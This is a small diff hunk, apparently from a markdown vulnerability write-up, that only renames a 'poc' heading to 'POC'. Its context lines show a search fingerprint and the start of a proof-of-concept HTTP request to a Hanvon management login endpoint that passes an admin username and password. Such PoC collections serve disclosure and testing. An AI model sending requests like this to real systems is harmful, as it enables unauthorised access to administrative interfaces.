@@ -8,7 +8,7 @@
 icon_hash="1380907357"
 ```
 
-## poc
+## POC
 ```
 POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
 Host: hanvon.mrxn.net
